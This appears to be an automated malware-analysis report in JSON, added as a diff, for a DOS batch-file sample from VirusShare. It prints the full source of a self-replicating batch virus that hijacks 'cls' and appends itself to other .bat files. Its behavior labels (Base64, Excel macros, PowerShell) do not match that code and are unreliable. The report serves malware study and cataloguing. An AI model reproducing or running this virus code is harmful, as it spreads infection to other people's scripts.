@@ -1,0 +1,57 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
+            "call": "May call a DLL using Excel 4 Macros",
+            "command": "May run PowerShell commands"
+        },
+        "macro": "@echo off%_ClsV%\nif '%1=='ClsV goto clsv_%2\nif '%1=='-ClsV cls\nif exist c:\\clsv.bat goto ClsV_1\nif not exist %0.bat goto ClsV_X\nfind \"ClsV\"<%0.bat>c:\\clsv.bat\n:ClsV_1\ndoskey cls=c:\\clsv.bat -ClsV\ncommand /c c:\\clsv.bat ClsV 2\ngoto ClsV_X\n:ClsV_2 \nfor %%a in (*.bat ..\\*.bat) do call %0 ClsV 3 %%a  \nexit ClsV\n:ClsV_3\nfind \"ClsV\"<%3>nul\nif not errorlevel 1 goto ClsV_X\ntype %3>ClsV\necho.>>ClsV\ntype c:\\clsv.bat>>ClsV\nmove ClsV %3>nul\nexit ClsV\n:ClsV_X"
+    },
+    "filename": "VirusShare_5211879e0c90b540e3dd3bb57d6aa0f2",
+    "filesize": 473,
+    "filetype": "DOS batch file, ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "5211879e0c90b540e3dd3bb57d6aa0f2",
+        "sha1": "ab71517b668421743eea2cd792f8d534da0f6e1c",
+        "sha256": "a45777d481979088851467f5adfb04d0329f504355d83739a9db23f9022f567c"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "@echo off%_ClsV%",
+            "if '%1=='ClsV goto clsv_%2",
+            "if '%1=='-ClsV cls",
+            "if exist c:\\clsv.bat goto ClsV_1",
+            "if not exist %0.bat goto ClsV_X",
+            "find \"ClsV\"<%0.bat>c:\\clsv.bat",
+            ":ClsV_1",
+            "doskey cls=c:\\clsv.bat -ClsV",
+            "command /c c:\\clsv.bat ClsV 2",
+            "goto ClsV_X",
+            ":ClsV_2 ",
+            "for %%a in (*.bat ..\\*.bat) do call %0 ClsV 3 %%a  ",
+            "exit ClsV",
+            ":ClsV_3",
+            "find \"ClsV\"<%3>nul",
+            "if not errorlevel 1 goto ClsV_X",
+            "type %3>ClsV",
+            "echo.>>ClsV",
+            "type c:\\clsv.bat>>ClsV",
+            "move ClsV %3>nul",
+            "exit ClsV",
+            ":ClsV_X"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.259338",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
